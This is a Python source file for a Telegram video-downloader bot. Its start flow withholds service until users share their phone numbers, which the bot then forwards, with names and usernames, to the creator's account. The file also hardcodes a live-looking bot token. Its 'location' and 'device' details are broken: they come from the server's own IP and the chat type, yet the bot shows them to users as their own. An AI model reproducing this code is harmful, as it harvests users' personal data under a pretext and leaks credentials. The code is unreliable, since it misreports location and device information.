import os
import logging
import re
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import yt_dlp
import requests

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8434128207:AAH-BnEeeW1pR2X2n1OjrUs2NtWJGPh8Qs8"
BOT_CREATOR = "@Kingwahidafg"

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Storage
user_languages = {}
user_contacts = {}
user_locations = {}
user_devices = {}
online_users = set()

# ==================== WELCOME MESSAGES ====================
WELCOME_MESSAGES = {
    'english': {
        'text': "🔥 *WAHIDX DOWNLOADER* 🔥\n\n✨ *Welcome* {name}! ✨\n└ 👤 Username: @{username}\n└ 📞 Phone: `{phone}`\n└ 🌍 Country: {country}\n└ 🏙️ City: {city}\n└ 💻 Device: {device}\n└ 🤖 Bot Creator: {creator}\n\n💫 *I can download videos from:*\n📌 YouTube | Instagram | TikTok\n📌 Twitter/X | Facebook | Reddit\n📌 And 1000+ more platforms!\n\n⚡ *Just send me any video link!*",
        'instruction': "\n\n📥 *How to use:*\nSimply send any video link and I'll download it in best quality!\n\n🎯 *Supported formats:* MP4, MOV, AVI\n⚡ *Max size:* 50MB\n\n👥 *Total users:* {total_users}\n📊 *Online users:* {online_users}",
    },
    'pashto': {
        'text': "🔥 *واهدکس ډاونلوډر* 🔥\n\n✨ *ښه راغلاست* {name}! ✨\n└ 👤 یوزرنیم: @{username}\n└ 📞 شمیره: `{phone}`\n└ 🌍 هیواد: {country}\n└ 🏙️ ښار: {city}\n└ 💻 وسیله: {device}\n└ 🤖 بوټ جوړونکی: {creator}\n\n💫 *زه کولای شم د دې پلیټفارمونو څخه ویډیوګانې ډاونلوډ کړم:*\n📌 یوټیوب | انسټاګرام | ټیکټاک\n📌 تویټر/X | فیسبوک | ریډیټ\n📌 او ۱۰۰۰+ نور پلیټفارمونه!\n\n⚡ *یوازې ما ته د ویډیو لینک راولیږئ!*",
        'instruction': "\n\n📥 *د کارولو طریقه:*\nیوازې د ویډیو لینک رالیږئ او زه به یې په غوره کیفیت سره ډاونلوډ کړم!\n\n🎯 *ملاتړ شوي فورمېټونه:* MP4, MOV, AVI\n⚡ *اعظمي اندازه:* 50MB\n\n👥 *ټول کارونکي:* {total_users}\n📊 *آنلاین کارونکي:* {online_users}",
    },
    'farsi': {
        'text': "🔥 *واهدکس دانلودر* 🔥\n\n✨ *خوش آمدید* {name}! ✨\n└ 👤 نام کاربری: @{username}\n└ 📞 شماره: `{phone}`\n└ 🌍 کشور: {country}\n└ 🏙️ شهر: {city}\n└ 💻 دستگاه: {device}\n└ 🤖 سازنده بات: {creator}\n\n💫 *من می‌توانم ویدیوها را از این پلتفرم‌ها دانلود کنم:*\n📌 یوتیوب | اینستاگرام | تیک‌تاک\n📌 توییتر/X | فیسبوک | ردیت\n📌 و بیش از ۱۰۰۰ پلتفرم دیگر!\n\n⚡ *فقط لینک ویدیو را برای من بفرستید!*",
        'instruction': "\n\n📥 *نحوه استفاده:*\nفقط لینک ویدیو را بفرستید تا با بهترین کیفیت دانلود کنم!\n\n🎯 *فرمت‌های پشتیبانی:* MP4, MOV, AVI\n⚡ *حداکثر حجم:* 50MB\n\n👥 *کاربران کل:* {total_users}\n📊 *کاربران آنلاین:* {online_users}",
    }
}

# ==================== YT-DLP OPTIONS ====================
YDL_OPTIONS = {
    'format': 'best[height<=720]/best',
    'outtmpl': 'downloads/%(title)s.%(ext)s',
    'noplaylist': True,
    'quiet': True,
    'no_warnings': True,
    'ignoreerrors': True,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

# ==================== HELPER FUNCTIONS ====================
async def get_ip_location(ip_address):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                }
    except Exception as e:
        logger.error(f"Location error: {e}")
    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}

async def get_device_info(user_agent):
    device_info = {'device': 'Unknown', 'os': 'Unknown', 'browser': 'Telegram App'}
    ua = user_agent or ''
    
    if 'Android' in ua:
        device_info['device'] = 'Android Phone'
        device_info['os'] = 'Android'
    elif 'iPhone' in ua:
        device_info['device'] = 'iPhone'
        device_info['os'] = 'iOS'
    elif 'Windows' in ua:
        device_info['device'] = 'Windows PC'
        device_info['os'] = 'Windows'
    elif 'Macintosh' in ua:
        device_info['device'] = 'Mac'
        device_info['os'] = 'macOS'
    elif 'Linux' in ua:
        device_info['device'] = 'Linux PC'
        device_info['os'] = 'Linux'
    
    if 'Chrome' in ua and 'Edg' not in ua:
        device_info['browser'] = 'Chrome'
    elif 'Firefox' in ua:
        device_info['browser'] = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua:
        device_info['browser'] = 'Safari'
    
    return device_info

# ==================== COMMAND HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact_button = KeyboardButton("📞 Share My Phone Number", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], one_time_keyboard=True, resize_keyboard=True)
    
    welcome_text = f"🌟 *WAHIDX DOWNLOADER V4.0* 🌟\n\n👤 *Welcome {user.first_name}!*\n\n📢 *Please share your phone number* to continue.\n\n👇 *Click the button below:*"
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    
    if not contact:
        await update.message.reply_text("❌ Please share your phone number using the button!")
        return
    
    user_contacts[user.id] = contact.phone_number
    online_users.add(user.id)
    
    # Get IP address
    try:
        ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip_address = ip_response.json()['ip'] if ip_response.status_code == 200 else 'Unknown'
    except:
        ip_address = 'Unknown'
    
    location_info = await get_ip_location(ip_address)
    device_info = await get_device_info(str(update.message.chat.type))
    user_locations[user.id] = location_info
    user_devices[user.id] = device_info
    
    keyboard = [
        [
            InlineKeyboardButton("🇬🇧 English", callback_data='lang_english'),
            InlineKeyboardButton("🇦🇫 پښتو", callback_data='lang_pashto'),
            InlineKeyboardButton("🇮🇷 فارسی", callback_data='lang_farsi'),
        ]
    ]
    
    welcome_text = f"✅ *Phone number received!*\n\n📞 `{contact.phone_number}`\n🌍 {location_info.get('country', 'Unknown')}\n🏙️ {location_info.get('city', 'Unknown')}\n\n🌐 *Choose your language:*"
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Notify creator
    try:
        await context.bot.send_message(
            BOT_CREATOR,
            f"🆕 *NEW USER!*\n👤 {user.first_name} (@{user.username or 'no username'})\n📞 `{contact.phone_number}`\n🌍 {location_info.get('country', 'Unknown')}\n👥 Total: {len(user_contacts)}",
            parse_mode='Markdown'
        )
    except:
        pass

async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    lang_code = query.data.split('_')[1]
    user_languages[user.id] = lang_code
    
    phone = user_contacts.get(user.id, "Not shared")
    location = user_locations.get(user.id, {})
    device = user_devices.get(user.id, {})
    
    welcome_data = WELCOME_MESSAGES[lang_code]
    text = welcome_data['text'].format(
        name=user.first_name or "User",
        username=user.username or "unknown",
        phone=phone,
        country=location.get('country', 'Unknown'),
        city=location.get('city', 'Unknown'),
        device=f"{device.get('device', 'Unknown')} ({device.get('os', 'Unknown')})",
        creator=BOT_CREATOR
    )
    
    text += welcome_data['instruction'].format(
        total_users=len(user_contacts),
        online_users=len(online_users)
    )
    
    await query.message.edit_text(text, parse_mode='Markdown')

async def handle_video_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    url = update.message.text.strip()
    lang = user_languages.get(user.id, 'english')
    
    if not re.match(r'https?://[^\s]+', url):
        await update.message.reply_text("❌ *Invalid URL!*\n\nPlease send a valid video link.", parse_mode='Markdown')
        return
    
    msg = await update.message.reply_text("🔄 *Processing video...*\n\n⏳ Please wait!", parse_mode='Markdown')
    
    os.makedirs('downloads', exist_ok=True)
    
    try:
        with yt_dlp.YoutubeDL(YDL_OPTIONS) as ydl:
            info = ydl.extract_info(url, download=True)
            filename = ydl.prepare_filename(info)
            
            if not os.path.exists(filename):
                for ext in ['.mp4', '.webm', '.mkv']:
                    test = filename.rsplit('.', 1)[0] + ext
                    if os.path.exists(test):
                        filename = test
                        break
            
            file_size = os.path.getsize(filename) / (1024 * 1024)
            
            if file_size > 50:
                os.remove(filename)
                await msg.edit_text(f"❌ *File too large!*\n\nSize: {file_size:.1f}MB\nTelegram limit: 50MB", parse_mode='Markdown')
                return
            
            await msg.edit_text("📤 *Uploading video...*", parse_mode='Markdown')
            
            duration = info.get('duration', 0)
            caption = f"🎬 *Video Downloaded!*\n\n⏱️ Duration: {duration//60}:{duration%60:02d}\n🤖 @WAHIDX_DOWNLOADER"
            
            with open(filename, 'rb') as f:
                await update.message.reply_video(video=f, caption=caption, parse_mode='Markdown')
            
            await msg.delete()
            os.remove(filename)
            
    except Exception as e:
        logger.error(f"Download error: {e}")
        await msg.edit_text(f"❌ *Download failed!*\n\nError: {str(e)[:100]}\n\nContact {BOT_CREATOR}", parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.username != "Kingwahidafg" and str(user.id) != "8434128207":
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    text = f"📊 *STATISTICS*\n\n👥 Total Users: {len(user_contacts)}\n✅ Active: {len(user_languages)}\n🟢 Online: {len(online_users)}"
    await update.message.reply_text(text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_languages.get(update.effective_user.id, 'english')
    text = f"📚 *Help*\n\nSend any video link from YouTube, Instagram, TikTok, Facebook, Twitter, etc.\n\n👨‍💻 Creator: {BOT_CREATOR}"
    await update.message.reply_text(text, parse_mode='Markdown')

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("🇬🇧 English", callback_data='lang_english'),
            InlineKeyboardButton("🇦🇫 پښتو", callback_data='lang_pashto'),
            InlineKeyboardButton("🇮🇷 فارسی", callback_data='lang_farsi'),
        ]
    ]
    await update.message.reply_text("🌐 *Choose language:*", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# ==================== MAIN ====================
def main():
    os.makedirs('downloads', exist_ok=True)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("language", language_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_video_link))
    application.add_handler(CallbackQueryHandler(language_callback, pattern='^lang_'))
    
    # Start bot
    print("🤖 WAHIDX DOWNLOADER V4.0 - Running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
